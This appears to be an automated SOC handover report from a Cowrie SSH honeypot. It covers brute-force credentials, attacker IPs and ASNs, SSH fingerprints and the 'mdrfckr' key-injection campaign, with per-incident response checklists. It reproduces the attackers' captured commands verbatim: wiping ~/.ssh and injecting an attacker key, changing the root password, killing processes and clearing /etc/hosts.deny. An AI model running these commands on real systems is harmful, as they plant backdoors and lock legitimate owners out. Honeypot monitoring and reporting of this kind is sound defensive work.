# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-17 |
| **Generated At** | 2026-04-17T09:23:45Z |
| **Shift Time** | 09:23 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **338** |
| Confirmed Threats | **337** |
| False Positives Filtered | **1** (0.3%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **11** |
| High Severity Cases | **124** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **214** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **269** |
| Unique Credential Pairs | **143** |
| Unique Usernames | **49** |
| Unique Passwords | **141** |
| Successful Auth Pairs | **79** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 124 |
| `345gs5662d34` | 57 |
| `ubuntu` | 12 |
| `test` | 7 |
| `n8n` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 58 |
| `345gs5662d34` | 57 |
| `123456` | 3 |
| `woaini1314` | 3 |
| `123456@asd` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 58 |
| `345gs5662d34` | `345gs5662d34` | 57 |
| `root` | `woaini1314` | 3 |
| `root` | `123456@asd` | 2 |
| `stefan` | `stefan123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456@asd` | `43.132.227.251` | 2026-04-17T06:42:49 |
| `root` | `3245gs5662d34` | `43.132.227.251` | 2026-04-17T06:42:53 |
| `root` | `3edc@@` | `183.56.216.153` | 2026-04-17T06:45:53 |
| `root` | `---fuck_you----` | `101.96.199.38` | 2026-04-17T06:46:48 |
| `root` | `Root123456789@#` | `34.78.29.97` | 2026-04-17T06:47:21 |
| `root` | `3245gs5662d34` | `34.78.29.97` | 2026-04-17T06:47:25 |
| `root` | `qwerty123456!@#$%^` | `206.42.14.196` | 2026-04-17T06:47:39 |
| `root` | `3245gs5662d34` | `206.42.14.196` | 2026-04-17T06:47:46 |
| `root` | `Qazwsx654321@` | `34.78.29.97` | 2026-04-17T06:50:04 |
| `root` | `zhang123` | `34.78.29.97` | 2026-04-17T06:51:26 |
| `root` | `a123123` | `125.77.133.94` | 2026-04-17T06:51:31 |
| `root` | `qwertyuiop@123456` | `34.78.29.97` | 2026-04-17T06:52:46 |
| `root` | `Admin123456@123` | `34.78.29.97` | 2026-04-17T06:54:04 |
| `root` | `root6` | `34.78.29.97` | 2026-04-17T06:55:21 |
| `root` | `ZZaa123123` | `34.78.29.97` | 2026-04-17T06:56:41 |
| `root` | `root@1234` | `125.77.133.94` | 2026-04-17T06:56:49 |
| `root` | `3245gs5662d34` | `125.77.133.94` | 2026-04-17T06:56:57 |
| `root` | `Sq123456` | `59.50.24.47` | 2026-04-17T06:57:12 |
| `root` | `3245gs5662d34` | `59.50.24.47` | 2026-04-17T06:57:21 |
| `root` | `Qwertyuiop!!` | `206.42.14.196` | 2026-04-17T06:57:36 |
| `root` | `root123123@` | `182.52.109.76` | 2026-04-17T06:57:59 |
| `root` | `3245gs5662d34` | `182.52.109.76` | 2026-04-17T06:58:04 |
| `root` | `Hx123456` | `182.52.109.76` | 2026-04-17T06:59:52 |
| `root` | `1122` | `59.50.24.47` | 2026-04-17T07:00:23 |
| `root` | `Root2019@123` | `59.50.24.47` | 2026-04-17T07:01:18 |
| `root` | `hz@123456` | `182.52.109.76` | 2026-04-17T07:03:21 |
| `root` | `Root2021@#` | `34.78.29.97` | 2026-04-17T07:04:53 |
| `root` | `qwertyuiop123456789` | `182.52.109.76` | 2026-04-17T07:05:07 |
| `root` | `Qwertyuiop2023` | `206.42.14.196` | 2026-04-17T07:06:01 |
| `root` | `root2024..` | `125.77.133.94` | 2026-04-17T07:07:20 |
| `root` | `Admin@123#` | `206.42.14.196` | 2026-04-17T07:07:38 |
| `root` | `zabbix` | `182.52.109.76` | 2026-04-17T07:08:28 |
| `root` | `User123` | `34.78.29.97` | 2026-04-17T07:08:49 |
| `root` | `123.ZXCV` | `182.52.109.76` | 2026-04-17T07:10:10 |
| `root` | `Pass@123` | `34.78.29.97` | 2026-04-17T07:10:11 |
| `root` | `12345Qwerty` | `206.42.14.196` | 2026-04-17T07:10:58 |
| `root` | `123456@asd` | `34.78.29.97` | 2026-04-17T07:12:59 |
| `root` | `Qazwsx123321!@#` | `34.78.29.97` | 2026-04-17T07:14:22 |
| `root` | `ZAQ!2wsx2024#$` | `182.52.109.76` | 2026-04-17T07:15:22 |
| `root` | `Y4k1nm4suk.2026` | `59.50.24.47` | 2026-04-17T07:15:40 |
| `root` | `a123456c` | `206.42.14.196` | 2026-04-17T07:15:51 |
| `root` | `Qwerty!@#` | `34.78.29.97` | 2026-04-17T07:17:09 |
| `root` | `qazwsx11111@` | `182.52.109.76` | 2026-04-17T07:20:27 |
| `root` | `root1234567!!` | `206.42.14.196` | 2026-04-17T07:20:57 |
| `root` | `123456789!` | `206.42.14.196` | 2026-04-17T07:22:38 |
| `root` | `zaq12wsX` | `206.42.14.196` | 2026-04-17T07:24:22 |
| `root` | `Password@12` | `206.42.14.196` | 2026-04-17T07:26:02 |
| `root` | `ddXX1234` | `182.52.109.76` | 2026-04-17T07:27:26 |
| `root` | `Abcd12345678@@` | `182.52.109.76` | 2026-04-17T07:37:45 |
| `root` | `aaXX123` | `14.103.113.212` | 2026-04-17T09:01:28 |
| `root` | `3245gs5662d34` | `14.103.113.212` | 2026-04-17T09:01:34 |
| `root` | `root2020..` | `14.103.121.146` | 2026-04-17T09:05:20 |
| `root` | `3245gs5662d34` | `14.103.121.146` | 2026-04-17T09:05:30 |
| `root` | `Root20!` | `58.229.141.26` | 2026-04-17T09:06:48 |
| `root` | `3245gs5662d34` | `58.229.141.26` | 2026-04-17T09:06:52 |
| `root` | `Aa1234567890@` | `119.96.157.188` | 2026-04-17T09:08:20 |
| `root` | `qazwsx2025#$` | `58.229.141.26` | 2026-04-17T09:08:26 |
| `root` | `root#123` | `210.79.191.76` | 2026-04-17T09:09:09 |
| `root` | `3245gs5662d34` | `210.79.191.76` | 2026-04-17T09:09:14 |
| `root` | `5tgb%TGB` | `93.48.24.181` | 2026-04-17T09:09:47 |
| `root` | `3245gs5662d34` | `93.48.24.181` | 2026-04-17T09:09:54 |
| `root` | `root123456789..` | `103.234.53.69` | 2026-04-17T09:10:27 |
| `root` | `3245gs5662d34` | `103.234.53.69` | 2026-04-17T09:10:32 |
| `root` | `woaini1314` | `93.48.24.181` | 2026-04-17T09:10:36 |
| `root` | `woaini1314` | `210.79.191.76` | 2026-04-17T09:10:50 |
| `root` | `qwert123@` | `119.96.157.188` | 2026-04-17T09:11:46 |
| `root` | `Qazwsx888..` | `103.234.53.69` | 2026-04-17T09:12:05 |
| `root` | `Papa@1234` | `58.229.141.26` | 2026-04-17T09:13:17 |
| `root` | `Qazwsx0000!@` | `58.229.141.26` | 2026-04-17T09:14:51 |
| `root` | `qazwsx1234567!!` | `93.48.24.181` | 2026-04-17T09:15:40 |
| `root` | `5tgb%TGB` | `210.79.191.76` | 2026-04-17T09:16:01 |
| `root` | `Qazwsx12345!` | `58.229.141.26` | 2026-04-17T09:16:25 |
| `root` | `1233211234` | `103.234.53.69` | 2026-04-17T09:18:27 |
| `root` | `Mm123456.` | `93.48.24.181` | 2026-04-17T09:19:03 |
| `root` | `1233211234` | `58.229.141.26` | 2026-04-17T09:19:50 |
| `root` | `Papa@1234` | `103.234.53.69` | 2026-04-17T09:20:11 |
| `root` | `woaini1314` | `122.166.167.154` | 2026-04-17T09:20:25 |
| `root` | `3245gs5662d34` | `122.166.167.154` | 2026-04-17T09:20:28 |
| `root` | `Mexico123` | `93.48.24.181` | 2026-04-17T09:22:27 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **338** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 332 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 328 | 18 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 328 | 18 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 3 | — |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 4 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 58 | 13 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Dsx4McbKVCgT"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `183.56.216.153`, `125.77.133.94`, `59.50.24.47`, `119.96.157.188`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:bVH8gidVSPiD"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `93.48.24.181`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `125.77.133.94`, `103.234.53.69`, `206.42.14.196`, `14.103.121.146`, `182.52.109.76`, `58.229.141.26`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **20** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS396982` | Google LLC | 1 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 1 | HIGH |
| `AS58563` | CHINANET Hubei province network | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (124)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e1eae08c7a1b

| Field | Detail |
|---|---|
| **Source IP** | `43.132.227[.]251` |
| **First Seen** | 2026-04-17 06:42 |
| **Last Seen** | 2026-04-17 06:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:42:49` | `cowrie.session.connect` |
| `2026-04-17 06:42:49` | `cowrie.client.version` |
| `2026-04-17 06:42:49` | `cowrie.client.kex` |
| `2026-04-17 06:42:49` | `cowrie.login.success` |
| `2026-04-17 06:42:50` | `cowrie.session.params` |
| `2026-04-17 06:42:50` | `cowrie.command.input` |
| `2026-04-17 06:42:50` | `cowrie.command.failed` |
| `2026-04-17 06:42:50` | `cowrie.log.closed` |
| `2026-04-17 06:42:50` | `cowrie.session.params` |
| `2026-04-17 06:42:50` | `cowrie.command.input` |
| `2026-04-17 06:42:50` | `cowrie.session.file_download` |
| `2026-04-17 06:42:50` | `cowrie.log.closed` |
| `2026-04-17 06:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.132.227[.]251` to AbuseIPDB if not already reported
- [ ] Block `43.132.227[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b331cd199a12

| Field | Detail |
|---|---|
| **Source IP** | `43.132.227[.]251` |
| **First Seen** | 2026-04-17 06:42 |
| **Last Seen** | 2026-04-17 06:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:42:52` | `cowrie.session.connect` |
| `2026-04-17 06:42:52` | `cowrie.client.version` |
| `2026-04-17 06:42:53` | `cowrie.client.kex` |
| `2026-04-17 06:42:53` | `cowrie.login.success` |
| `2026-04-17 06:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.132.227[.]251` to AbuseIPDB if not already reported
- [ ] Block `43.132.227[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-949f1bec8d63

| Field | Detail |
|---|---|
| **Source IP** | `183.56.216[.]153` |
| **First Seen** | 2026-04-17 06:45 |
| **Last Seen** | 2026-04-17 06:46 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Dsx4McbKVCgT"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:45:50` | `cowrie.session.connect` |
| `2026-04-17 06:45:50` | `cowrie.client.version` |
| `2026-04-17 06:45:51` | `cowrie.client.kex` |
| `2026-04-17 06:45:53` | `cowrie.login.success` |
| `2026-04-17 06:45:53` | `cowrie.session.params` |
| `2026-04-17 06:45:53` | `cowrie.command.input` |
| `2026-04-17 06:45:53` | `cowrie.command.failed` |
| `2026-04-17 06:45:53` | `cowrie.log.closed` |
| `2026-04-17 06:45:54` | `cowrie.session.params` |
| `2026-04-17 06:45:54` | `cowrie.command.input` |
| `2026-04-17 06:45:55` | `cowrie.session.file_download` |
| `2026-04-17 06:45:55` | `cowrie.log.closed` |
| `2026-04-17 06:46:13` | `cowrie.session.params` |
| `2026-04-17 06:46:13` | `cowrie.command.input` |
| `2026-04-17 06:46:14` | `cowrie.log.closed` |
| `2026-04-17 06:46:14` | `cowrie.session.params` |
| `2026-04-17 06:46:14` | `cowrie.command.input` |
| `2026-04-17 06:46:15` | `cowrie.log.closed` |
| `2026-04-17 06:46:19` | `cowrie.session.params` |
| `2026-04-17 06:46:19` | `cowrie.command.input` |
| `2026-04-17 06:46:19` | `cowrie.session.file_download` |
| `2026-04-17 06:46:19` | `cowrie.log.closed` |
| `2026-04-17 06:46:20` | `cowrie.session.params` |
| `2026-04-17 06:46:20` | `cowrie.command.input` |
| `2026-04-17 06:46:20` | `cowrie.log.closed` |
| `2026-04-17 06:46:21` | `cowrie.session.params` |
| `2026-04-17 06:46:21` | `cowrie.command.input` |
| `2026-04-17 06:46:21` | `cowrie.log.closed` |
| `2026-04-17 06:46:21` | `cowrie.session.params` |
| `2026-04-17 06:46:21` | `cowrie.command.input` |
| `2026-04-17 06:46:21` | `cowrie.command.input` |
| `2026-04-17 06:46:22` | `cowrie.log.closed` |
| `2026-04-17 06:46:23` | `cowrie.session.params` |
| `2026-04-17 06:46:23` | `cowrie.command.input` |
| `2026-04-17 06:46:24` | `cowrie.log.closed` |
| `2026-04-17 06:46:24` | `cowrie.session.params` |
| `2026-04-17 06:46:24` | `cowrie.command.input` |
| `2026-04-17 06:46:24` | `cowrie.log.closed` |
| `2026-04-17 06:46:26` | `cowrie.session.params` |
| `2026-04-17 06:46:26` | `cowrie.command.input` |
| `2026-04-17 06:46:27` | `cowrie.log.closed` |
| `2026-04-17 06:46:28` | `cowrie.session.params` |
| `2026-04-17 06:46:28` | `cowrie.command.input` |
| `2026-04-17 06:46:28` | `cowrie.log.closed` |
| `2026-04-17 06:46:29` | `cowrie.session.params` |
| `2026-04-17 06:46:29` | `cowrie.command.input` |
| `2026-04-17 06:46:29` | `cowrie.log.closed` |
| `2026-04-17 06:46:30` | `cowrie.session.params` |
| `2026-04-17 06:46:30` | `cowrie.command.input` |
| `2026-04-17 06:46:30` | `cowrie.log.closed` |
| `2026-04-17 06:46:31` | `cowrie.session.params` |
| `2026-04-17 06:46:31` | `cowrie.command.input` |
| `2026-04-17 06:46:31` | `cowrie.log.closed` |
| `2026-04-17 06:46:32` | `cowrie.session.params` |
| `2026-04-17 06:46:32` | `cowrie.command.input` |
| `2026-04-17 06:46:33` | `cowrie.log.closed` |
| `2026-04-17 06:46:33` | `cowrie.session.params` |
| `2026-04-17 06:46:33` | `cowrie.command.input` |
| `2026-04-17 06:46:33` | `cowrie.log.closed` |
| `2026-04-17 06:46:35` | `cowrie.session.params` |
| `2026-04-17 06:46:35` | `cowrie.command.input` |
| `2026-04-17 06:46:37` | `cowrie.log.closed` |
| `2026-04-17 06:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.56.216[.]153` to AbuseIPDB if not already reported
- [ ] Block `183.56.216[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94e305a60c88

| Field | Detail |
|---|---|
| **Source IP** | `101.96.199[.]38` |
| **First Seen** | 2026-04-17 06:46 |
| **Last Seen** | 2026-04-17 06:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:46:48` | `cowrie.session.connect` |
| `2026-04-17 06:46:48` | `cowrie.client.version` |
| `2026-04-17 06:46:48` | `cowrie.client.kex` |
| `2026-04-17 06:46:48` | `cowrie.login.success` |
| `2026-04-17 06:46:50` | `cowrie.session.params` |
| `2026-04-17 06:46:50` | `cowrie.command.input` |
| `2026-04-17 06:46:56` | `cowrie.log.closed` |
| `2026-04-17 06:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.199[.]38` to AbuseIPDB if not already reported
- [ ] Block `101.96.199[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c09729969ed

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:47 |
| **Last Seen** | 2026-04-17 06:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:47:20` | `cowrie.session.connect` |
| `2026-04-17 06:47:20` | `cowrie.client.version` |
| `2026-04-17 06:47:20` | `cowrie.client.kex` |
| `2026-04-17 06:47:21` | `cowrie.login.success` |
| `2026-04-17 06:47:21` | `cowrie.session.params` |
| `2026-04-17 06:47:21` | `cowrie.command.input` |
| `2026-04-17 06:47:21` | `cowrie.command.failed` |
| `2026-04-17 06:47:21` | `cowrie.log.closed` |
| `2026-04-17 06:47:22` | `cowrie.session.params` |
| `2026-04-17 06:47:22` | `cowrie.command.input` |
| `2026-04-17 06:47:22` | `cowrie.session.file_download` |
| `2026-04-17 06:47:22` | `cowrie.log.closed` |
| `2026-04-17 06:47:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5549aa625eec

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:47 |
| **Last Seen** | 2026-04-17 06:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:47:24` | `cowrie.session.connect` |
| `2026-04-17 06:47:24` | `cowrie.client.version` |
| `2026-04-17 06:47:24` | `cowrie.client.kex` |
| `2026-04-17 06:47:25` | `cowrie.login.success` |
| `2026-04-17 06:47:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3809c454b241

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 06:47 |
| **Last Seen** | 2026-04-17 06:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
